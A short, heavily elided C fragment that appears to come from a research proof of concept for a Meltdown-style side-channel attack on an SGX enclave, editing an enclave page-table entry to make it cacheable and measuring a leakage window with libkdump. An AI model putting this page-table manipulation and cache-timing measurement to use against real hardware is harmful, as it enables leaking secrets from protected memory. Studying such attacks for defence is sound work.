...
size_t dummy_secret[80] = {0x23 << 12, 0x4 << 12, 0, 0, 0, 0, 0, 0, 0x42 << 12, 0, 0, 0, 0, 0, 0, 0, 
...
int main(int argc, char *argv[]) {
  ...
  *pte_encl = MARK_CACHEABLE( *pte_encl );
  // *pte_encl = MARK_NON_WRITABLE( *pte_encl );
  ...
  // while (1) {
    int value = libkdump_window_measure((size_t)shadow_secret, (size_t)dummy_secret, 
      MELTDOWN_WRITE, CACHE_LEVEL_L1, TLB_DEFAULT, 0x42);
